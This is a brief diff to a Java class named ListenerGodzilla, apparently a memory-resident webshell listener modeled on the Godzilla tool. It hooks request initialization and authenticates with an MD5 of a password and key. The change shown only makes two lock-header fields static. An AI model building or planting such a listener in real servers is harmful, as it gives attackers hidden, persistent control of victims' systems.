@@ -20,8 +20,8 @@ public class ListenerGodzilla implements InvocationHandler {
     public static String key; // key
     public static String pass;
     public static String md5 = md5(pass + key);
-    private String lockHeaderKey;
-    private String lockHeaderValue;
+    private static String lockHeaderKey;
+    private static String lockHeaderValue;
 
     public Object invoke(Object proxy, Method method, Object[] args) {
         if (method.getName().equals("requestInitialized")) {
